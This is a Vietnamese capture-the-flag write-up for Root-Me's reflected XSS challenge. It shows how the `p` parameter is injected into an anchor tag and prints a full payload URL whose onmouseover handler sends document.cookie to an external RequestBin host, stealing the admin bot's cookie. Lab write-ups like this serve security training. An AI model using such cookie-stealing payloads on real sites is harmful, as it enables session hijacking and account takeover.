# [XSS Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)

Kiểm tra source website ta thấy web bị comment 1 thẻ <<a>> dẫn đến `?p=security`:

![](./media/image1.png)

Request đến `?p=security`, website hiển thị trang web lỗi và có một hyperlink thẻ `<a>` hiển thị nội dung `security`:

![](./media/image2.png)

Thử nhập `?p=<giá trị khác>`, page sẽ báo lỗi và hiển thị nội dung `<giá trị khác>` trong thẻ `<a>`. Như vậy, lợi dụng thẻ `<a>` này, ta thực hiện đóng quote cũng như chèn thêm event để thực hiện XSS:

![](./media/image3.png)

Đến đây, sau khi thử get trực tiếp document.cookie nhưng không có giá trị, ta thực hiện gửi HTTP Request và qua RequestBin chờ cookie.

Payload: <http://challenge01.root-me.org/web-client/ch26/?p=nh4ttruong%27%20onmouseover=%27document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?%22.concat(document.cookie)>

Thực hiện request với payload, sau đó ta trigger event `onmouseover` và di chuyển chuột qua thẻ `<a>` để chuyển hướng website:

![](./media/image4.png)

Sau đó, ta thực hiện lại một lần nữa nhưng sẽ thực hiện thêm bước Report đến admin đển POST request:

![](./media/image5.png)

![](./media/image6.png)

Qua **RequestBin** và nhận flag:

![](./media/image7.png)

- Flag: "****************************"
